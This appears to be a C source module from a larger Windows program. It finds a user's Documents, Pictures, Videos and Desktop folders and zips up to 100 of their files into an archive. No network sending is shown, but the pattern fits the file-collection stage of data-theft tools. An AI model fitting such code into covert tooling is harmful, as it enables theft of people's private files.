#include "file_enum.h"
#include "miniz.h"
#include "../config.h"
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define MAX_FILES     100
#define MAX_FILE_SIZE (50 * 1024 * 1024)  /* 50 MB par fichier max */

/* Résout le nom de dossier en chemin absolu via CSIDL */
static void get_folder_path(const char *name, char *out, size_t out_size) {
    int csidl = -1;
    if      (strcmp(name, "Documents") == 0) csidl = CSIDL_PERSONAL;
    else if (strcmp(name, "Images")    == 0) csidl = CSIDL_MYPICTURES;
    else if (strcmp(name, "Videos")    == 0) csidl = CSIDL_MYVIDEO;
    else if (strcmp(name, "Bureau")    == 0) csidl = CSIDL_DESKTOPDIRECTORY;

    if (csidl >= 0)
        SHGetFolderPath(NULL, csidl, NULL, SHGFP_TYPE_CURRENT, out);
    else
        strncpy(out, name, out_size - 1);
}

/* Lit un fichier et l'ajoute à l'archive ZIP */
static void add_to_zip(mz_zip_archive *zip, const char *filepath, const char *zipname) {
    FILE *f = fopen(filepath, "rb");
    if (!f) return;

    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (sz <= 0 || sz > MAX_FILE_SIZE) { fclose(f); return; }

    void *buf = malloc((size_t)sz);
    if (!buf) { fclose(f); return; }

    fread(buf, 1, (size_t)sz, f);
    fclose(f);

    mz_zip_writer_add_mem(zip, zipname, buf, (size_t)sz, MZ_DEFAULT_COMPRESSION);
    free(buf);
}

void enumerate_and_zip_folder(const char *folder_name, const char *zip_output_path) {
    char folder[MAX_PATH] = {0};
    get_folder_path(folder_name, folder, sizeof(folder));

    char search[MAX_PATH];
    snprintf(search, sizeof(search), "%s\\*", folder);

    mz_zip_archive zip;
    memset(&zip, 0, sizeof(zip));
    if (!mz_zip_writer_init_file(&zip, zip_output_path, 0)) return;

    WIN32_FIND_DATA fd;
    HANDLE h = FindFirstFile(search, &fd);
    if (h == INVALID_HANDLE_VALUE) {
        mz_zip_writer_finalize_archive(&zip);
        mz_zip_writer_end(&zip);
        return;
    }

    int count = 0;
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        if (count >= MAX_FILES) break;

        char filepath[MAX_PATH];
        snprintf(filepath, sizeof(filepath), "%s\\%s", folder, fd.cFileName);
        add_to_zip(&zip, filepath, fd.cFileName);
        count++;
    } while (FindNextFile(h, &fd));

    FindClose(h);
    mz_zip_writer_finalize_archive(&zip);
    mz_zip_writer_end(&zip);
}
